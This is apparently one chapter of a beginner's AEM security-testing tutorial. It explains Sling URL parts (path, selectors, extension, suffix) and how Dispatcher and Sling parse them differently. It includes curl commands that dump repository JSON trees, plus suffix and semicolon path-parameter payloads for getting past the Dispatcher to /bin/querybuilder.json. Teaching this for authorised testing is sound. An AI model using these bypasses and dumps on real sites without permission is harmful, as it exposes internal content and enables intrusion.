# 3 — Sling URLs (the weird AEM superpower)

This is the **one concept** that unlocks half of AEM testing.  
Read once. Paste examples. Move on.

---

## Normal URL (what you already know)

```text
https://site.com/folder/page.html
                 \____path____/ \ext/
```

---

## AEM / Sling URL (extra pieces)

```text
https://site.com/folder/page.sel1.sel2.html/extra/stuff?x=1
                 \__path__/ \selectors/ \ext/ \__suffix__/
```

| Piece | Where | Simple meaning |
|-------|--------|----------------|
| **path** | Before first “special” dots | Which node in the tree |
| **selectors** | Dots **between** name and extension | Extra switches: “render differently” |
| **extension** | Last bit like `html`, `json`, `css` | Format / which servlet |
| **suffix** | Starts with `/` **after** the extension | Extra path passed to the code |
| **path parameters** | `;name=value` (semicolon) | Extra flags; often ignored by bouncer |

### Concrete example

```text
/content/page.list.html/sub/path
```

Means:

- Resource: `/content/page`  
- Selector: `list`  
- Extension: `html`  
- Suffix: `/sub/path`

---

## Why this matters for hacking

1. **Dispatcher (bouncer)** parses the URL with **its own** simple rules.  
2. **Sling (real app)** parses the URL with **smarter** rules.  
3. If they disagree → you reach things the bouncer thought it blocked.

Also: many dangerous features are just **selectors** or **extensions** hanging off normal pages:

```text
/content/home.infinity.json     ← dump JSON tree
/content/home.1.json
/content/home.rawcontent.html
/content/home.listParagraphs.html?...
/content/dam.form.css/bin/querybuilder.json   ← suffix trick
```

---

## DefaultGETServlet (catch-all JSON)

If nothing special matches, Sling’s **DefaultGETServlet** can still answer.

Famous patterns:

```bash
T="https://TARGET"
PAGE="/content/YOUR/PAGE"

# depth-limited dumps
curl -sk "$T${PAGE}.1.json" | head -c 2000; echo
curl -sk "$T${PAGE}.2.json" | head -c 2000; echo
curl -sk "$T${PAGE}.3.json" | head -c 2000; echo

# deep dump (can be huge / blocked)
curl -sk "$T${PAGE}.infinity.json" | head -c 2000; echo

# other views (try; may 404)
curl -sk -o /dev/null -w "%{http_code}\n" "$T${PAGE}.tidy.json"
curl -sk -o /dev/null -w "%{http_code}\n" "$T${PAGE}.sysview.xml"
curl -sk -o /dev/null -w "%{http_code}\n" "$T${PAGE}.docview.xml"
```

**Why:** Each number is “how deep to walk the tree.”  
`.infinity.json` = walk forever (often blocked or huge).

---

## Path parameters (semicolon) — bouncer blind spot

Example used in modern research:

```text
/bin/querybuilder.json;x='a/b.css/c'
```

**Bouncer thinks:** extension is `.css` (allowed static file).  
**Sling thinks:** path `/bin/querybuilder`, extension `json`, weird `;...` param.

→ See [04-dispatcher-bypasses.md](./04-dispatcher-bypasses.md).

---

## Matrix / suffix intuition

| Trick | Looks like | Effect |
|-------|------------|--------|
| Selector chain | `.savedsearch.rawcontent.html` | Two switches at once |
| Allowed extension | `.css` / `.js` / `.png` | Looks “static” to filters |
| Suffix | `...html/bin/querybuilder.json` | App may **forward** suffix as real path |

---

## Kid-level analogy

- **Path** = which book on the shelf  
- **Selector** = “read it as a comic / as an audiobook / as raw text”  
- **Extension** = output format  
- **Suffix** = sticky note with extra instructions  
- **Dispatcher** = librarian who only reads the cover badly  
- **Sling** = person who actually opens the book

---

## Done when

- [ ] You can point at any AEM URL and name path / selector / extension / suffix  
- [ ] You tried `.1.json` on a real page  

**Next:** [04-dispatcher-bypasses.md](./04-dispatcher-bypasses.md)
